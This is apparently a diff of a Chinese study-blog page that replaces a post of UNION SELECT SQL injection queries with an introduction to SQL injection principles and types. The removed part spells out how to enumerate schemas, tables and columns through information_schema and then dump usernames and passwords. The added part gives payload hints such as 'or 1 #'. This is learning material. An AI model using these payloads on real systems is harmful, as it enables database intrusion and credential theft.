@@ -10,7 +10,8 @@
 
     <!--Description-->
     
-        <meta name="description" content="UNION SELECT 联合查询1234567891011121314151617181920212223242526271.判断当前数据表中字段数 使用  order by SELECT * FROM `mysql`.`user` WHERE `user` = &amp;apos;root&amp;apos; ">
+        <meta name="description" content="SQL注入原理​        对用户输入没有进行严格的过滤处理，并且带入 SQL语句中执行进行数据库操作，​        攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据​        把用户输入的数据当做代码来执行，违背了“数据与代码分离”的原则
+### S">
     
 
     <!--Author-->
@@ -20,7 +21,7 @@
 
     <!--Open Graph Title-->
     
-        <meta property="og:title" content="20190813 UNION SELECT 联合查询">
+        <meta property="og:title" content="SQL注入原理简介">
     
 
     <!--Open Graph Description-->
@@ -42,7 +43,7 @@
 
     <!-- Title -->
     
-    <title>20190813 UNION SELECT 联合查询 - XMD5 STUDY BLOG</title>
+    <title>SQL注入原理简介 - XMD5 STUDY BLOG</title>
 
     <!-- Tachyons Core CSS -->
     <link rel="stylesheet" href="https://unpkg.com/tachyons/css/tachyons.min.css">
@@ -98,8 +99,8 @@
     <!-- Title -->
     <div class="w-100 mw8 center vh-40 dt">
         <div class="dtc v-mid white">
-            <h1 class="f1-l f2-m tc tc-m tl-ns">20190813 UNION SELECT 联合查询</h1>
-            <p class="f4 fw3 pab-100px tc tc-m tl-ns">2019-08-13</p>
+            <h1 class="f1-l f2-m tc tc-m tl-ns">SQL注入原理简介</h1>
+            <p class="f4 fw3 pab-100px tc tc-m tl-ns">2019-08-15</p>
         </div>
     </div>
 
@@ -119,9 +120,16 @@
                     
 
                     <!-- Main Post Content -->
-                    <h3 id="UNION-SELECT-联合查询"><a href="#UNION-SELECT-联合查询" class="headerlink" title="UNION SELECT 联合查询"></a>UNION SELECT 联合查询</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">1.判断当前数据表中字段数 使用  order by </span><br><span class="line"></span><br><span class="line">SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; order by 49;//显示内容</span><br><span class="line">SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; order by 50;//不显示内容，说明字段数为49</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2.联合查询 数据库 名称</span><br><span class="line"></span><br><span class="line">SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; and 1=2 union select (select group_concat(distinct table_schema) from information_schema.columns),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1；</span><br><span class="line">// and 1=2 让前面查询语句查询为假，不显示</span><br><span class="line">//distinct 去重</span><br><span class="line">//group_concat 显示到一行</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3.联合查询 test 库中 数据表 名称</span><br><span class="line"></span><br><span class="line">SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; and 1=2 union select (select group_concat(distinct table_name) from information_schema.columns where table_schema =&apos;test&apos;),2,3,4,5,6,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">4. 联合查询 test.users 中的 字段名称</span><br><span class="line"></span><br><span class="line">SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; and 1=2 union select (select group_concat(distinct column_name) from information_schema.columns where table_schema =&apos;test&apos; and table_name=&apos;users&apos;),2,3,4,5,6,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">5.查询 test.users 中的 username passwd 内容</span><br><span class="line"></span><br><span class="line">SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; and 1=2 union select (select group_concat(username,&apos;-&apos;,passwd) from test.users),2,3,4,5,6,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1;</span><br></pre></td></tr></table></figure>
+                    <h2 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h2><p>​        对用户输入没有进行严格的过滤处理，并且带入 SQL语句中执行进行数据库操作，<br>​        攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据<br>​        把用户输入的数据当做代码来执行，违背了“数据与代码分离”的原则</p>
+<pre><code>### SQL注入漏洞有两个关键条件：</code></pre><p>​        用户能控制输入的内容<br>​        Web应用把用户输入的内容带入到数据库中执行       </p>
+<h3 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h3><pre><code>请求方式不同分为
+   GET方式请求注入
+   POST方式请求注入
+   请求头注入
 
-
+ sql注入点的参数类型分为
+   整数型注入------没有单引号，直接利用，注释后部  or 1 #
+   字符型注入------破坏单引号，注释后部</code></pre>
                     
                     <!-- Tags Bottom -->
                     
